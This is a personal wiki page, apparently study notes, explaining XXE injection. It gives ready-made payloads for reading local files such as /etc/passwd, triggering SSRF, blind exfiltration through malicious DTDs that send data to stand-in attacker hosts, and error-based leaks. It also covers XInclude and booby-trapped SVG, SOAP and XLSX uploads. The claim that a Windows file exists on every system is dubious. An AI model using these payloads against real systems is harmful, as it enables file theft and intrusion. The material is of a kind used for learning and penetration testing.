@@ -1,0 +1,163 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Split this into multiple notes  XXE Injection The XML format allows users to specify entities which can be used inside the XML document using the formant &amp;entityname;."><title>XXE Injection</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://wiki.yigit.run//icon.png><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Source+Sans+Pro:wght@400;600;700&family=Fira+Code:wght@400;700&display=swap" rel=stylesheet><link href=https://wiki.yigit.run/styles.3748f4c347fc49171ca41d87b4965282.min.css rel=stylesheet><script src=https://wiki.yigit.run/js/gnuplot_api.8e1c31098e0ba119f7824a661b56d4a4.min.js></script>
+<script>const gnuplot_link="/js/gnuplot.44eb85f3f3fb2223f46a016f467bd5b4.js"</script><script src=https://wiki.yigit.run/js/gnuplot_render.f03d1b9dc0e81e8e9b17ea995631e7ce.min.js></script>
+<script src=https://wiki.yigit.run/js/darkmode.60008d21c68ae1873118e110b3a2aeda.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://wiki.yigit.run/js/popover.688c5dcb89a57776d7f1cbeaf6f7c44b.min.js></script>
+<script>const BASE_URL="https://wiki.yigit.run/",fetchData=Promise.all([fetch("https://wiki.yigit.run/indices/linkIndex.467462fd623be9705726167175980afe.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://wiki.yigit.run/indices/contentIndex.407232f1f62696047d1c33f4dd191dc0.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const n=new URL("https://wiki.yigit.run/"),s=n.pathname,o=window.location.pathname,i=s==o,e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=i&&!0;drawGraph("https://wiki.yigit.run",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2}),initPopover("https://wiki.yigit.run",!0,!0)},init=(e=document)=>{renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/wiki.yigit.run\/js\/router.d210fe830d11c8189fafa831c7e08a6b.min.js"
+    attachSPARouting(init, render)
+  </script></head><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://wiki.yigit.run/js/search.cf33b507388f3dfd5513a2afcda7af41.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://wiki.yigit.run/>Neocortex 🧠</a></h1><svg tabindex="0" id="search-icon" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg><div class=spacer></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>XXE Injection</h1><p class=meta>Last updated November 16, 2021</p><ul class=tags><li><a href=https://wiki.yigit.run/tags/cs/security/>Cs security</a></li><li><a href=https://wiki.yigit.run/tags/cs/web/>Cs web</a></li></ul><ul><li><input disabled type=checkbox> Split this into multiple notes</li></ul><a href=#xxe-injection><h1 id=xxe-injection><span class=hanchor arialabel=Anchor># </span>XXE Injection</h1></a><p>The XML format allows users to specify entities which can be used inside the XML document using the formant <code>&amp;entityname;</code>. These entities can be fetched over the network or can be read from a file using payloads such as:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;http://evil.com&#34;&gt;</span> ]&gt;
+</span></span></code></pre></td></tr></table></div></div><p>This opens up the door to two different vulnerabilities: Retrieving Local Files and Server Side Request Forgery</p><a href=#retrieving-files><h2 id=retrieving-files><span class=hanchor arialabel=Anchor># </span>Retrieving Files</h2></a><p>Even though XXE can be used to read files, it often can't be used to list the contents of a directory. However, we can test whether an XXE vulnerability exists, we ca try and read a file that exists on every system and that can be read by every user. In linux, that file is <code>/etc/passwd</code> and in windows, that is <code>/c:/server_files/application.conf</code>. An example test payload for linux would be:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [ &lt;!ENTITY passwd SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;yeet&gt;</span><span class=ni>&amp;passwd;</span><span class=nt>&lt;/yeet&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#ssrf><h2 id=ssrf><span class=hanchor arialabel=Anchor># </span>SSRF</h2></a><a href=#regular-xxe><h3 id=regular-xxe><span class=hanchor arialabel=Anchor># </span>Regular XXE</h3></a><p>This bug can be tested by sending an XML document with an external entity that points to a known resource on the network. If a DNS or HTTP request is sent to that server after sending the XML request, an XXE vulnerability exists. However, this method doesn't always work since some systems block external entities on a network. Here is an example payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [ &lt;!ENTITY network SYSTEM &#34;http://evil.com&#34;&gt;</span> ]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;yeet&gt;</span><span class=ni>&amp;network;</span><span class=nt>&lt;/yeet&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#blind-xxe><h3 id=blind-xxe><span class=hanchor arialabel=Anchor># </span>Blind XXE</h3></a><p>Sometimes, when a server's response doesn't contain any part of the sent XML body, an XXE vulnerability might still exist. This can be tested using the Burp Collaborator.</p><a href=#xml-parameter-entities><h3 id=xml-parameter-entities><span class=hanchor arialabel=Anchor># </span>XML Parameter Entities</h3></a><p>Sometimes,applications block using entities for security reasons. However you can still inject external entities using <em>XML Parameter Entities</em>. Here is a sample payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [ &lt;!ENTITY % param SYSTEM &#34;http://evil.com&#34;&gt;</span> %param; ]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;yeet&gt;</span>data<span class=nt>&lt;/yeet&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#data-ex-filtration><h3 id=data-ex-filtration><span class=hanchor arialabel=Anchor># </span>Data Ex-filtration</h3></a><ol><li><p>With SSRF</p><p>Ex-filtrating data from blind XXE vulnerabilities is possible using a malicious
+<a href=https:www.w3schools.com/xml/xml_dtd.asp rel=noopener>DTD</a>. In order to exploit it, we need a server to serve a malicious DTD. Here is an example DTD:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span class=line><span class=cl>%eval;
+</span></span><span class=line><span class=cl>%exfiltrate;
+</span></span></code></pre></td></tr></table></div></div><p>You can then host this in a file under your server, accessible from a URL like <code>http://attacker.com/extractpasswd.dtd</code>. You can then use this file in an XXE payload like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;http://attacker.com/extractpasswd.dtd&#34;&gt;</span> %xxe;]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;yeet&gt;</span>data<span class=nt>&lt;/yeet&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This method doesn't work in multiline files however, so it can be used to leak files like <code>/etc/hostname</code>.</p></li><li><p>With Error Messages</p><p>If a web application returns error messages which can possibly contain details of an entity, this too can be exploited using a DTD. DTD Document:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span class=line><span class=cl>%eval;
+</span></span><span class=line><span class=cl>%error;
+</span></span></code></pre></td></tr></table></div></div><p>XXE Payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;http://attacker.com/error.dtd&#34;&gt;</span> %xxe;]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;yeet&gt;</span>data<span class=nt>&lt;/yeet&gt;</span>
+</span></span></code></pre></td></tr></table></div></div></li><li><p>Repurposing existing DTD files in a server</p><p>When out-of-band interactions are disabled by the web server's network settings or any other method, it won't be possible to include external DTD files. Hence, Blind XXE injection can only be exploited using a known DTD files in a system and using that file to leak data in the form of error messages. However, this DTD file should first be <em>edited</em> with a malicious XXE payload that accesses system files. Thankfully, XML allows us to <strong>overwrite</strong> some entries in an external DTD. For instance, if in a server there is a DTD file named /etc/DTDs/localdtd.dtd that also contains an entity named <strong>localentity</strong>, we can use the following payload to <strong>overwrite</strong> that entity.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [
+</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % local_dtd SYSTEM &#34;file:///etc/DTDs/localdtd.dtd&#34;&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY %  localentity&#39;
+</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span class=line><span class=cl><span class=ni>&amp;#x25;</span>eval;
+</span></span><span class=line><span class=cl><span class=ni>&amp;#x25;</span>error;
+</span></span><span class=line><span class=cl>&#39;&gt;
+</span></span><span class=line><span class=cl>%local_dtd;
+</span></span><span class=line><span class=cl>]&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Locating such files should be fairly straightforward since the web application returns errors from the xml parser, we can simply check whether a file exists by sending a benign payload and checking whether the server returns an error(the file doesn't exist) or not(the file exists)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [
+</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/test.dtd&#34;&gt;</span>
+</span></span><span class=line><span class=cl>%local_dtd;
+</span></span><span class=line><span class=cl>]&gt;
+</span></span></code></pre></td></tr></table></div></div></li></ol><a href=#exploiting-xinclude><h2 id=exploiting-xinclude><span class=hanchor arialabel=Anchor># </span>Exploiting XInclude</h2></a><p>Sometimes, even if you don't send XML data to a website, the application could still use the input you provided it to create an XML document. However, if the proper sanitisations are not made on the input, the final XML could be edited which can again be used to leak file information or to cause out-of-band interactions. Here is a sample payloads that uses xinclude:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;foo</span> <span class=na>xmlns:xi=</span><span class=s>&#34;http://www.w3.org/2001/XInclude&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;xi:include</span> <span class=na>parse=</span><span class=s>&#34;text&#34;</span> <span class=na>href=</span><span class=s>&#34;file:///etc/passwd&#34;</span><span class=nt>/&gt;&lt;/foo&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#file-upload-attacks><h2 id=file-upload-attacks><span class=hanchor arialabel=Anchor># </span>File Upload Attacks</h2></a><p>In theory, any file upload that uses xml and is parsed on the back-end side can be exploited. There are different methods for different filetypes and each should be tested thoroughly.</p><a href=#image-uploads-with-svg><h3 id=image-uploads-with-svg><span class=hanchor arialabel=Anchor># </span>Image Uploads with SVG</h3></a><p>Image upload forms can be vulnerable to XXE if they allow uploading SVG files. Here is a sample payload that should be tested:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;svg</span> <span class=na>width=</span><span class=s>&#34;128px&#34;</span> <span class=na>height=</span><span class=s>&#34;128px&#34;</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.w3.org/2000/svg&#34;</span> <span class=na>xmlns:xlink=</span><span class=s>&#34;http://www.w3.org/1999/xlink&#34;</span> <span class=na>version=</span><span class=s>&#34;1.1&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>font-size=</span><span class=s>&#34;16&#34;</span> <span class=na>x=</span><span class=s>&#34;0&#34;</span> <span class=na>y=</span><span class=s>&#34;16&#34;</span><span class=nt>&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/text&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/svg&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#soap-xxe><h3 id=soap-xxe><span class=hanchor arialabel=Anchor># </span>SOAP XXE</h3></a><p>This payload should be tested on every parameter where a SOAP query could be formed in the backend:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;soap:Body&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;foo&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=cp>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;/foo&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/soap:Body&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#docx><h3 id=docx><span class=hanchor arialabel=Anchor># </span>DOCX</h3></a><p>A great tool exists for injecting in docx files:
+<a href=https://github.com/BuffaloWill/oxml_xxe rel=noopener>https://github.com/BuffaloWill/oxml_xxe</a></p><a href=#xlsx><h3 id=xlsx><span class=hanchor arialabel=Anchor># </span>XLSX</h3></a><ol><li>Extract the excel file:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!-- --&gt;
+</span></span></code></pre></td></tr></table></div></div><pre><code>$ mkdir XXE &amp;&amp; cd XXE
+$ unzip ../XXE.xlsx
+Archive:  ../XXE.xlsx
+  inflating: xl/drawings/drawing1.xml
+  inflating: xl/worksheets/sheet1.xml
+  inflating: xl/worksheets/_rels/sheet1.xml.rels
+  inflating: xl/sharedStrings.xml
+  inflating: xl/styles.xml
+  inflating: xl/workbook.xml
+  inflating: xl/_rels/workbook.xml.rels
+  inflating: _rels/.rels
+  inflating: [Content_Types].xml
+</code></pre><ol><li>Add your blind XXE payload in <code>xl/workbook.xml</code> or add your payload in <code>xl/sharedStrings.xml</code></li></ol><p>xl/workbook.xml</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;xml...&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=cp>&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &#34;http://YOURCOLLABORATORID.burpcollaborator.net/&#34;&gt;</span> ]&gt;
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;x&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/x&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&lt;workbook...&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>xl/sharedString.xml</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [ &lt;!ELEMENT t ANY &gt;</span> <span class=cp>&lt;!ENTITY xxe SYSTEM &#34;http://YOURCOLLABORATORID.burpcollaborator.net/&#34;&gt;</span> ]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;sst</span> <span class=na>xmlns=</span><span class=s>&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> <span class=na>count=</span><span class=s>&#34;10&#34;</span> <span class=na>uniqueCount=</span><span class=s>&#34;10&#34;</span><span class=nt>&gt;&lt;si&gt;&lt;t&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA2<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA3<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA4<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA5<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB1<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB2<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB3<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB4<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB5<span class=nt>&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><ol><li>rebuild the Excel file:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!-- --&gt;
+</span></span></code></pre></td></tr></table></div></div><pre><code>$ zip -r ../poc.xlsx *
+updating: [Content_Types].xml (deflated 71%)
+updating: _rels/ (stored 0%)
+updating: _rels/.rels (deflated 60%)
+updating: docProps/ (stored 0%)
+updating: docProps/app.xml (deflated 51%)
+updating: docProps/core.xml (deflated 50%)
+updating: xl/ (stored 0%)
+updating: xl/workbook.xml (deflated 56%)
+updating: xl/worksheets/ (stored 0%)
+updating: xl/worksheets/sheet1.xml (deflated 53%)
+updating: xl/styles.xml (deflated 60%)
+updating: xl/theme/ (stored 0%)
+updating: xl/theme/theme1.xml (deflated 80%)
+updating: xl/_rels/ (stored 0%)
+updating: xl/_rels/workbook.xml.rels (deflated 66%)
+updating: xl/sharedStrings.xml (deflated 17%)</code></pre><script src=https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js></script>
+<script>mermaid.initialize({startOnLoad:!0,theme:"dark"}),GnuplotRenderer.renderPage()</script></article><hr><div class=page-end><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://wiki.yigit.run/js/graph.afdb02e537635f9a611b53a988e5645b.js></script></div></div><div id=contact_buttons><footer><p>Made by Yigit Colakoglu using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2022</p><ul><li><a href=/>Home</a></li><li><a href=https://twitter.com/theFr1nge>Twitter</a></li><li><a href=https://github.com/theFr1nge>Github</a></li></ul></footer></div></div></body></html>
